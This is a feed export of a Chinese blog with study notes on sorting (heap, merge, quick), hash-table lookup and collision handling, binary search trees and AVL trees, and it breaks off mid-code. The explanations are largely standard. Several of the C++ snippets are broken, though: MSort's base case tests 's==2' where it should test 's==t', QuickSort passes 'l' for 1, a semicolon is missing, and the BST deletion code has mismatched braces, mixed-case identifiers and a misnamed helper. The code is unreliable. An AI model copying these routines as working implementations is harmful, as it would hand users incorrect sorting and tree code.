&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个for循环用来构建堆，第二个for循环用来移除根结点后再次将剩下的构建成堆，这里选择最大堆还是最小堆没有太大的差异</p><p>在构建堆的过程中，因为我们是完全二叉树从最下层最右边的非终端节点开始构建，将它与其孩子进行比较和若有必要的互换，对于每个非终端节点来说，其实最多只需要两次比较和互换操作，<strong>因此构建对的时间复杂度为O(n)。</strong></p><p>正式排序的时候，第i次取堆顶记录重建堆需要用O(log i）时间（完全二叉树的某个结点到根结点的距离为[log~2~ i]+1，并且需要取n-1次堆顶记录，所以重建堆的时间复杂度为O(nlogn)</p><h2 id="八、归并排序"><a href="#八、归并排序" class="headerlink" title="八、归并排序"></a>八、归并排序</h2><p>基本思想：假设初始序列含有n个记录，则可以看成是n个有序的子序列，每个子序列的长度为1，然后两两归并，得到[n/2]个长度为2或1的有序子序列；再两两归并…….如此重复，直到得到一个长度为n的有序序列为止。</p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230328212758010.png" alt="归并排序"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MergeSort</span><span class="hljs-params">(SqList *L)</span></span>&#123;<br>    <span class="hljs-built_in">MSort</span>(L-&gt;r,L-&gt;r,<span class="hljs-number">1</span>,L-&gt;length);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MSort</span><span class="hljs-params">(<span class="hljs-type">int</span> SR[],<span class="hljs-type">int</span> TR1[],<span class="hljs-type">int</span> s,<span class="hljs-type">int</span> t)</span></span>&#123;<br>    <span class="hljs-type">int</span> m;<br>    <span class="hljs-type">int</span> TR2[MAXSIZE+<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span>(s==<span class="hljs-number">2</span>)<br>        TR1[s]=SR[s];<br>    <span class="hljs-keyword">else</span>&#123;<br>        m=(s+t)/<span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">MSort</span>(SR,TR2,s,m);<br>        <span class="hljs-built_in">MSort</span>(SR,TR2,m+<span class="hljs-number">1</span>,t);<br>        <span class="hljs-built_in">Merge</span>(TR2,TR1,s,m,t);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>时间复杂度：一趟归并需要将SR1~SR[n]中相邻的长度为h的有序序列进行两两归并，并将结果放到TR中，耗费O(n)时间，而由完全二叉树的深度可知，整个归并排序需要进行[log2 n]次，因此，总的时间复杂度为O(n logn )，同时归并排序是一种稳定的排序算法。</p><h2 id="九、快速排序"><a href="#九、快速排序" class="headerlink" title="九、快速排序"></a>九、快速排序</h2><p>快速排序的基本思想：通过一趟排序将待排记录分割成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序的目的。</p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210515134431451.gif" alt="快速排序"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QuickSort</span><span class="hljs-params">(SqList *L)</span></span>&#123;<br>    <span class="hljs-built_in">QSort</span>(L,l,L-&gt;length);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QSort</span><span class="hljs-params">(SqList *L,<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span></span>&#123;<br>    <span class="hljs-type">int</span> pivot;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        pivot=<span class="hljs-built_in">Partition</span>(L,low,high);<br>        <span class="hljs-built_in">QSort</span>(L,low,pivot<span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">QSort</span>(L,pivot+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Partition函数要做的就是先选取当中的一个关键字，然后想办法将它放到一个位置上，使得它左边的值都比他小，右边的值都比它大，这个关键字称为枢轴(pivot)</strong></p><p>快速排序之所以比较快，是因为与冒泡排序相比，每次的交换时跳跃式的，每次排序的时候设置一个基准点，将小于等于基准点的数全部放到基准点的左边，将大于等于基准点的数全部放到基准点的右边，这样在每次交换的时候就不会像冒泡排序一样每次只能在相邻的数之间进行交换，交换的距离就大的多了。</p><p>时间复杂度：在最坏的情况下，待排序的序列为正序或者逆序，每次划分只得到一个比上一次划分少一个记录的子序列，注意另一个为空。如果递归树画出来，这样的时间复杂度为O(n^2^)</p><p>所以选择的这个<strong>pivot</strong>很关键，如果他是尽可能在中间的位置的话，达到的效果最好。</p><p>平均时间复杂度：<strong>O(nlog n)</strong></p><h2 id="十、比较"><a href="#十、比较" class="headerlink" title="十、比较"></a>十、比较</h2><p>7种算法的指标比较</p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230329142845737.png" alt="算法比较"></p><p>仅作为学习记录，并非原创</p><p>参考链接：<a href="https://blog.csdn.net/weixin_50886514/article/details/119045154?ops_request_misc=%7B%22request%5Fid%22%3A%22168007137016782427487696%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168007137016782427487696&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-119045154-null-null.142^v77^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=希尔排序&amp;spm=1018.2226.3001.4187">六大排序算法</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>散列表查找</title>
    <link href="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/"/>
    <url>/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="散列表查找（哈希表）查找"><a href="#散列表查找（哈希表）查找" class="headerlink" title="散列表查找（哈希表）查找"></a>散列表查找（哈希表）查找</h1><p>散列技术是在记录的存储位置和它的关键字之间建立一个确定的对应关系f，使得每个关键字key对应一个存储位置f(key)</p><p>f称为散列函数，又称为哈希函数。采用散列技术将记录存储在一块连续的存储空间中，这块连续存储空间称为散列表或哈希表</p><h2 id="一、查找"><a href="#一、查找" class="headerlink" title="一、查找"></a>一、查找</h2><p>（1）在存储时，通过散列函数计算记录的散列地址，并按此散列地址存储该记录。</p><p>（2）当查找记录时，通过同样的散列函数计算记录的散列地址，按此散列地址访问该记录。</p><p>散列技术既是一种存储方法，也是一种查找方法。散列技术最适合的求解问题是查找与给定值相等的记录。</p><p>如果有同样的关键字对应多个记录的，则不适合用散列表技术，散列表也不适合范围查找。</p><p>另一个需要解决的问题是冲突，在理想情况下，一个关键字通过散列函数计算出来的地址都是不一样的，但在现实生活中，时常碰到两个关键字key不等，但是他们的散列值相等，这种现象叫做冲突。</p><h2 id="二、散列函数"><a href="#二、散列函数" class="headerlink" title="二、散列函数"></a>二、散列函数</h2><p>一个好的散列函数保证两个原则：<code>计算简单</code>和<code>散列地址分布均匀</code></p><h3 id="2-1-直接定址法"><a href="#2-1-直接定址法" class="headerlink" title="2.1 直接定址法"></a>2.1 直接定址法</h3><p>取关键字的某个线性函数值为散列地址：<code>f(key)=a×key+b</code>（a，b为常数）</p><h3 id="2-2-数字分析法"><a href="#2-2-数字分析法" class="headerlink" title="2.2 数字分析法"></a>2.2 数字分析法</h3><p>抽取方法是使用关键字的一部分来计算散列存储位置的方法，数字分析法通常适合处理关键字位数比较大的情况，如果事先知道关键字的分布且关键字的若干位分布较均匀，就可以考虑用这个方法</p><h3 id="2-3-平方取中法"><a href="#2-3-平方取中法" class="headerlink" title="2.3 平方取中法"></a>2.3 平方取中法</h3><p>假设关键字是1234，那么它的平方就是1522756，再抽取中间的3位就是227，用作散列地址。这个方法适合于不知道关键字的分布，而位数又不是很大的情况</p><h3 id="2-4-折叠法"><a href="#2-4-折叠法" class="headerlink" title="2.4 折叠法"></a>2.4 折叠法</h3><p>折叠法是将关键字从左到右分割成位数相等的几部分，然后将这几部分叠加求和，并按散列表表长，取后几位作为散列地址。折叠法事先不知道关键字的分布，适合关键字位数较多的情况。</p><h3 id="2-5-除留余数法"><a href="#2-5-除留余数法" class="headerlink" title="2.5 除留余数法"></a>2.5 除留余数法</h3><p><strong>f(key)=key mod p (p&lt;=m)</strong>，这种方法的关键就在于选择合适的p</p><h3 id="2-6-随机数法"><a href="#2-6-随机数法" class="headerlink" title="2.6 随机数法"></a>2.6 随机数法</h3><p><strong>f(key)=random(key)</strong>，random是随机函数</p><h2 id="三、冲突"><a href="#三、冲突" class="headerlink" title="三、冲突"></a>三、冲突</h2><h3 id="3-1-开放定址法"><a href="#3-1-开放定址法" class="headerlink" title="3.1 开放定址法"></a>3.1 开放定址法</h3><p>开放定址法就是一旦发生了冲突，就去寻找下一个空的散列地址，只要散列表开足够大，空的散列地址总能找到，并将记录存入。</p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327163528711.png" alt></p><p>这里的<strong>d~i~</strong>依次循环取值【1，m-1】，发生首次冲突的时候选择d~1~，根据上述公式计算出来的结果发现仍然是冲突的，则取d~2~…..直到不冲突为止</p><p><strong>这种解决冲突的开放定址法称为线性探测法</strong>，在解决冲突的时候，<strong>本来不是同义词的却需要争夺同一个地址的情况，这种现象叫做堆积</strong></p><p>如果对于一个冲突，如下图，与22发生冲突，根据线性探测法第一次解决冲突的时候，定位在47的位置，仍然冲突，尽管一直进行线性探测，可以探测到下标为9的地方，但是这种线性探测无论是存入还是查找效率都太低了，所以引入<strong>二次探测法</strong></p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327164129796.png" alt></p><p><strong>增加平方运算：为了不让关键字都聚集在某一块区域，这种方法叫做二次探测法</strong></p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327164438281.png" alt="二次探测"></p><p>还有一种方法是，在冲突时，对于位移量d~i~采用随机函数计算得到，我们称之为<strong>随机探测法</strong></p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327164634790.png" alt="随机探测法"></p><h3 id="3-2-再散列函数法"><a href="#3-2-再散列函数法" class="headerlink" title="3.2 再散列函数法"></a>3.2 再散列函数法</h3><p>对于散列表来说，我们事先准备多个散列函数</p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327164743621.png" alt="再散列函数法"></p><p>这里的RH~i~就是不同的散列函数，当发送散列地址冲突时，就换一个散列函数计算。这种方法能够使得关键字不产生聚集，当然，这也增加了计算的时间。</p><h3 id="3-3-链地址法"><a href="#3-3-链地址法" class="headerlink" title="3.3 链地址法"></a>3.3 链地址法</h3><p>将所有关键字为同义词的记录存储在一个单链表中，我们称这种表为同义词子表，在散列表中只存储所有同义词子表的头指针。</p><p>对于关键字集合{12,67,56,16,25,37,22,29,15,47,48,34}，我们用前面同样的12为除数，进行除留余数法，可以得到如下结构</p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327165242760.png" alt="链地址法"></p><p>链地址法对于可能会造成很多冲突的散列函数来说，提供了绝不会出现找不到地址的保障，但是这也就带来了查找时遍历单链表的性能损耗</p><h3 id="3-4-公共溢出区法"><a href="#3-4-公共溢出区法" class="headerlink" title="3.4 公共溢出区法"></a>3.4 公共溢出区法</h3><p>简单理解，公共溢出区法就是发生了冲突的我都将这些溢出存储到溢出表里</p><p><img src="/2023/03/27/%E6%95%A3%E5%88%97%E8%A1%A8%E6%9F%A5%E6%89%BE%EF%BC%88%E5%93%88%E5%B8%8C%E8%A1%A8%EF%BC%89%E6%9F%A5%E6%89%BE/image-20230327165511352.png" alt="公共溢出区法"></p><p>在查找的时候，对给定值通过散列函数计算出散列地址后，先与基本表的相应位置进行对比，如果相等，则查找成功；如果不想等，则到溢出表去进行顺序查找。如果相对于基本表而言，有冲突的数据很少的情况下，公共溢出区的结构对查找性能来说还是非常高的。</p><h2 id="四、性能"><a href="#四、性能" class="headerlink" title="四、性能"></a>四、性能</h2><p>散列表查找的性能作一个简单分析，如果没有冲突，散列查找的时间复杂度为O（1），但是实际生活中冲突是不可避免的。散列查找的平均查找长度取决于哪些因素呢？</p><h3 id="4-1-散列函数是否均匀"><a href="#4-1-散列函数是否均匀" class="headerlink" title="4.1 散列函数是否均匀"></a>4.1 散列函数是否均匀</h3><p>散列函数的好坏直接影响着出现冲突的频繁程度。但是不同的散列函数对同一组随机的关键字，产生冲突的可能性是相同的，因此我们不考虑它对平均查找长度的影响。</p><h3 id="4-2-处理冲突的方法"><a href="#4-2-处理冲突的方法" class="headerlink" title="4.2 处理冲突的方法"></a>4.2 处理冲突的方法</h3><p>线性探测处理冲突可能会产生堆积，显然没有二次探测法好，而链地址法处理冲突不会产生任何堆积，因此具有更佳的平均查找性能。</p><h3 id="4-3-散列表的装填因子"><a href="#4-3-散列表的装填因子" class="headerlink" title="4.3 散列表的装填因子"></a>4.3 散列表的装填因子</h3><p>装填因子α=填入表中的记录个数/散列表长度，α标志着散列表的装满的程度，当填入表中的记录越多，α就越大，产生冲突的可能性就越大。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BST、AVL、多路排序树</title>
    <link href="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/"/>
    <url>/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="一、二叉排序树"><a href="#一、二叉排序树" class="headerlink" title="一、二叉排序树"></a>一、二叉排序树</h1><p>二叉排序树，又称二叉查找树。它通常是一棵空树或者具有下列性质的二叉树。</p><blockquote><p>若它的左子树不空，则左子树上所有结点的值均小于它的根结构的值</p><p>若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值</p><p>它的左右子树也分别为二叉排序树</p></blockquote><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325142725549.png" alt="二叉排序树"></p><h2 id="1-二叉排序树的查找"><a href="#1-二叉排序树的查找" class="headerlink" title="1. 二叉排序树的查找"></a>1. 二叉排序树的查找</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//二叉树的二叉链表结点结构定义</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTNode</span>&#123;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTNode</span> *lchild,*rchild;<br>&#125;BiTNode,*BiTree;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//递归查找二叉排序树T中是否存在Key</span><br><span class="hljs-comment">//指针f指向T的双亲，其初始调用值为NULL</span><br><span class="hljs-comment">//若查找成功，则指针p指向该数据元素结点，并返回TRUE</span><br><span class="hljs-comment">//否则指针p指向查找路径上访问的最后一个结点并返回False</span><br><span class="hljs-function">Status <span class="hljs-title">SearchBST</span><span class="hljs-params">(BiTree T,<span class="hljs-type">int</span> key,BiTree f,BiTree *p)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(!T)&#123;<br>        *p=f;<br>        <span class="hljs-keyword">return</span> False;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key==T-&gt;data)&#123;<br>        *p=T;<br>        <span class="hljs-keyword">return</span> True;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;T-&gt;data)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">SearchBST</span>(T-&gt;lchild,key,T,p);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">SearchBST</span>(T-&gt;rchild,key,T,p);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-二叉排序树的插入"><a href="#2-二叉排序树的插入" class="headerlink" title="2. 二叉排序树的插入"></a>2. 二叉排序树的插入</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//当二叉排序树T中不存在关键字等于Key的数据元素时</span><br><span class="hljs-comment">//插入Key并返回TRUE，否则返回False</span><br><span class="hljs-function">Status <span class="hljs-title">InsertBST</span><span class="hljs-params">(BiTree *T,<span class="hljs-type">int</span> key)</span></span>&#123;<br>    BiTree p,s;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">SearchBST</span>(*T,key,<span class="hljs-literal">NULL</span>,&amp;p))&#123;<br>        s=(BiTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTNode));<br>        s-&gt;data=key;<br>        s-&gt;lchild=s-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span>(!p)<br>            *T=s;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;p-&gt;data)<br>            p-&gt;lchild=s;<br>        <span class="hljs-keyword">else</span><br>            p-&gt;rchild=s;<br>        <span class="hljs-keyword">return</span> TRUE<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-二叉排序树删除操作"><a href="#3-二叉排序树删除操作" class="headerlink" title="3. 二叉排序树删除操作"></a>3. 二叉排序树删除操作</h2><p>对删除结点有三种情况的分析：</p><blockquote><p>叶子结点</p><p>仅有左或右子树的结点</p><p>左右子树都有的结点</p></blockquote><p>对于前面两种情况，非常的简单，删除叶子结点直接删除即可，将指向该叶子结点的指针设为NULL。如果是第二种情况，也很容易考虑，直接<code>子承父业</code>，欲删除结点的孩子结点代替当前欲删除结点的位置即可</p><p>这里重点考虑第三种情况，左右子树都有的结点，其核心思想就是在左右子树中找到一个结点来代替欲删除结点，这个目标结点就是其data值最接近欲删除结点的的值的结点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Status <span class="hljs-title">DeleteBST</span><span class="hljs-params">(BiTree *T,<span class="hljs-type">int</span> key)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(!*T)<br>        RETURN False;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(key==(*T)-&gt;data)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">Delete</span>(T);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;(*T-&gt;data))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">DeleteBST</span>(&amp;(*T)-&gt;lchild,key);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">DeleteBST</span>(&amp;(*T)-&gt;rchild,key);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Status <span class="hljs-title">DeleteBST</span><span class="hljs-params">(BiTree *p)</span></span>&#123;<br>    BiTree q,s;<br>    <span class="hljs-keyword">if</span>((*p)-&gt;rchild==<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        *p=(*p)-&gt;lchild;<br>        <span class="hljs-built_in">free</span>(q);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*P)-&gt;lchild==<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        *p=(*p)-&gt;rchild;<br>        <span class="hljs-built_in">free</span>(q);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        q=*p;<br>        s=(*p)-&gt;lchild;<br>        <span class="hljs-keyword">while</span>(s-&gt;rchild)&#123;<br>            q=s;<br>            s=s-&gt;rchild;<br>        &#125;<br>        (*p)-&gt;data=s-&gt;data;<br>        <span class="hljs-keyword">if</span>(q!=*p)<br>            q-&gt;rchild=s-&gt;lchild;<br>        <span class="hljs-keyword">else</span><br>            q-&gt;lchild=s-&gt;lchild;<br>        <span class="hljs-built_in">free</span>(s);<br>    &#125;<br>    <span class="hljs-keyword">return</span> True;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码实际上是找的小于欲删除结点的data值中最接近的结点，如果我们寻找大于欲删除结点的data值中最接近的结点也可以。</p><h1 id="二、平衡二叉树（AVL树）"><a href="#二、平衡二叉树（AVL树）" class="headerlink" title="二、平衡二叉树（AVL树）"></a>二、平衡二叉树（AVL树）</h1><p>平衡二叉树是一种二叉排序树，其中每一个节点的左子树和右子树的高度差至多等于1</p><p>二叉树上结点的左子树深度减去右子树深度的值称为平衡因子BF，平衡二叉树上所有结点的平衡因子只可能是-1,0和1。只要二叉树上有一个结点的平衡因子的绝对值大于1，则该二叉树就是不平衡的。</p><p>距离插入结点最近的，且平衡因子的绝对值大于1的结点为根的子树，我们称为<code>最小不平衡子树</code></p><h2 id="1-平衡二叉树的实现原理"><a href="#1-平衡二叉树的实现原理" class="headerlink" title="1. 平衡二叉树的实现原理"></a>1. 平衡二叉树的实现原理</h2><p>平衡二叉树构建的基本思想就是在构建二叉排序树的过程中，每当插入一个结点时，先检查是否因插入而破坏了树的平衡性，若是，则找出最小不平衡子树。在保持二叉排序树特性的前提下，调整最小不平衡子树中各结点之间的链接关系，进行相应的旋转，使之成为新的平衡子树。</p><p>对于数组<strong>a[10]=[3,2,1,4,5,6,7,10,9,8]</strong>，我们对其进行平衡二叉树的构建。</p><p>3，2正常构建，到1的时候，如果是正常构建，则是这样的情况</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325193758453.png" alt="图1"></p><p>此时发现，3的BF为2，需要进行调整，对其进行右旋，得到</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325193846995.png" alt="图2"></p><p>然后继续对后面的数据进行考虑，4</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325193916702.png" alt="图3"></p><p>插入5，此时3的BF为-2，我们进行左旋</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325193947790.png" alt="图4"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194020809.png" alt="图5"></p><p>继续插入6，此时2的BF值为-2，进行左旋，本来结点3是4的左孩子，由于旋转后需要满足二叉排序树特性，因此它成了结点2的右孩子</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194050267.png" alt="图6"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194129727.png" alt="图7"></p><p>插入7，此时5的BF为-2，</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194256933.png" alt="图8"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194350467.png" alt="图9"></p><p>插入10，结构无变化</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194422506.png" alt="图10"></p><p>插入9，此时7的BF为-2，需要进行旋转，但是为了保证二叉排序树的特性，不能进行简单的左旋，如果简单的左旋之后，9会成为10的右孩子，但是这样不满足二叉排序树的特性。</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194628700.png" alt="图11"></p><p>这是因为7的BF为-2，但是10的BF为1，正负不统一，所以我们先进行符号的统一，对10,9进行右旋</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194746279.png" alt="图12"></p><p>此时统一了符号，再对7,9,10进行左旋</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194832008.png" alt="图13"></p><p>插入8，情况跟刚才的类似，6和9的BF符号不统一，我们对9,7进行右旋，右旋完毕之后，6，7的BF均为-2，我们再对6,7进行左旋，得到最终结果。</p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325194913495.png" alt="图14"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325195010419.png" alt="图15"></p><p><img src="/2023/03/25/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20230325200817440.png" alt="图16"></p><h2 id="2-平衡二叉树实现算法"><a href="#2-平衡二叉树实现算法" class="headerlink" title="2. 平衡二叉树实现算法"></a>2. 平衡二叉树实现算法</h2><p>结点结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTNode</span>&#123;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-type">int</span> bf;<span class="hljs-comment">//平衡因子</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTNode</span>*lchild,*rchild;<br>&#125;BiTNode,*BiTree;<br></code></pre></td></tr></table></figure><p>右旋</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 